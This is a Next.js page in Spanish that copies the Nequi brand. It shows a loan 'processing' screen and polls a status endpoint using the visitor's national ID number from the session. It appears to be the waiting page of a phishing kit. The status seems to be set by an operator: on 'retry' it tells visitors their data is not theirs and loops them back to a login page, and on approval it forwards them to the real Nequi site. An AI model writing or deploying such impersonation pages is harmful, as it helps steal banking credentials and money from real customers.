'use client'

import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import Image from "next/image"
import LoadingSpinner from "@/app/components/loading-spinner"
import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { useRouter } from "next/navigation"
import TransitionLoader from "../components/transition-loader"
import Link from "next/link"

export default function ProcesandoPage() {
  const [status, setStatus] = useState<'processing' | 'approved' | 'rejected' | 'retry'>('processing')
  const [showTransition, setShowTransition] = useState(false)
  const router = useRouter()

  useEffect(() => {
    const checkStatus = async () => {
      const cedula = sessionStorage.getItem('cedula');
      if (!cedula) {
        router.push('/');
        return;
      }

      try {
        // Primera verificación inmediata
        const initialResponse = await fetch(`/api/loan-status?cedula=${cedula}`);
        const initialData = await initialResponse.json();
        
        if (initialData.status !== 'processing') {
          setShowTransition(true);
          setTimeout(() => {
            setStatus(initialData.status);
            setShowTransition(false);
            
            // Si el estado es 'retry', limpiar sessionStorage y redirigir al login
            if (initialData.status === 'retry') {
              setTimeout(() => {
                sessionStorage.clear();
                router.push('/login');
              }, 3000); // Dar tiempo para mostrar el mensaje antes de redirigir
            }
          }, 2000);
          return;
        }

        // Iniciar polling solo si el estado inicial es 'processing'
        const interval = setInterval(async () => {
          try {
            const response = await fetch(`/api/loan-status?cedula=${cedula}`);
            const data = await response.json();
            
            if (data.status !== 'processing') {
              clearInterval(interval);
              setShowTransition(true);
              setTimeout(() => {
                setStatus(data.status);
                setShowTransition(false);
                
                // Si el estado es 'retry', limpiar sessionStorage y redirigir al login
                if (data.status === 'retry') {
                  setTimeout(() => {
                    sessionStorage.clear();
                    router.push('/login');
                  }, 3000);
                }
              }, 2000);
            }
          } catch (error) {
            console.error('Error polling status:', error);
          }
        }, 2000);

        return () => clearInterval(interval);
      } catch (error) {
        console.error('Error checking loan status:', error);
      }
    };

    checkStatus();
  }, [router])

  return (
    <main className="min-h-screen bg-pink-50 relative">

      {/* Navbar */}
      <nav className="relative z-10 bg-white shadow-sm px-4 py-2">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <Image
            src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
            alt="Nequi Logo"
            width={120}
            height={40}
            priority
          />
          <Button
            variant="ghost"
            onClick={() => window.location.reload()}
            className="bg-[#E6007E] hover:bg-[#C4006B] text-white rounded-md px-4 py-2"
          >
            Recargar
          </Button>
        </div>
      </nav>

      {showTransition && <TransitionLoader />}
      {/* Background Image */}
      <div 
        className="absolute inset-0 bg-cover bg-center z-0"
        style={{ 
          backgroundImage: 'url("img/background.png")',
          opacity: 0.1 
        }}
      />

      <div className="container mx-auto px-4 py-8 max-w-3xl">
        <div className="flex justify-center mb-8">
          <Image
            src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
            alt="Nequi Logo"
            width={150}
            height={50}
            priority
          />
        </div>

        <Card className="shadow-lg border-2">
          <CardHeader className="text-center pb-2">
            <CardTitle className="text-2xl font-manrope">
              {status === 'processing' && 'Procesando solicitud...'}
              {status === 'approved' && '¡Solicitud Aprobada!'}
              {status === 'rejected' && 'Solicitud Rechazada'}
              {status === 'retry' && '¡Ups no se pudo!'}
            </CardTitle>
          </CardHeader>
          <CardContent className="text-center space-y-6 pt-4">
            {status === 'processing' ? (
              <>
                <div className="flex flex-col items-center gap-4">
                  <LoadingSpinner />
                  <div className="space-y-2">
                    <p className="text-lg font-medium text-[#200020]">
                      Estamos validando tu información
                    </p>
                    <p className="text-gray-600">
                      Este proceso puede tardar unos minutos. Por favor, no cierres esta ventana.
                    </p>
                  </div>
                </div>
                <div className="bg-gray-50 p-4 rounded-lg">
                  <h3 className="font-medium mb-2">Mientras esperas:</h3>
                  <ul className="text-sm text-gray-600 space-y-1">
                    <li>• Verificamos tu historial crediticio</li>
                    <li>• Evaluamos tu capacidad de pago</li>
                    <li>• Preparamos tu oferta personalizada</li>
                  </ul>
                </div>
              </>
            ) : status === 'approved' ? (
              <>
                <div className="flex justify-center">
                  <div className="bg-green-100 p-3 rounded-full">
                    <svg className="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                </div>
                <div className="space-y-4">
                  <p className="text-lg text-gray-700">
                    Tu crédito ha sido pre-aprobado. En breve recibirás un mensaje con los siguientes pasos.
                  </p>
                  <Button 
                    onClick={() => window.open('https://www.nequi.com.co/personas/credito/propulsor', '_blank')}
                    className="bg-[#E6007E] hover:bg-[#C4006B] text-white px-8 py-2 rounded-xl">
                    Continuar
                  </Button>
                </div>
              </>
            ) : status === 'rejected' ? (
              <>
                <div className="flex justify-center">
                  <div className="bg-red-100 p-3 rounded-full">
                    <svg className="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                  </div>
                </div>
                <div className="space-y-4">
                  <p className="text-lg text-gray-700">
                    En este momento no podemos aprobar tu solicitud. Te invitamos a intentarlo nuevamente en unos dias.
                  </p>
                  <Button 
                    onClick={() => router.push('/')}
                    className="bg-[#E6007E] hover:bg-[#C4006B] text-white px-8 py-2 rounded-xl">
                    Volver al inicio
                  </Button>
                </div>
              </>
            ) : (
              <>
                <div className="flex justify-center">
                  <div className="bg-red-100 p-3 rounded-full">
                    <svg className="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                  </div>
                </div>
                <div className="space-y-4">
                  <p className="text-lg text-gray-700">
                    estos no son tus datos, tranquilo, intenta nuevamente con los datos correctos.
                  </p>
                  <p className="text-center text-gray-600">
                    Redirigiendo al inicio...
                  </p>
                </div>
              </>
            )}
          </CardContent>
        </Card>
      </div>
    </main>
  )
}
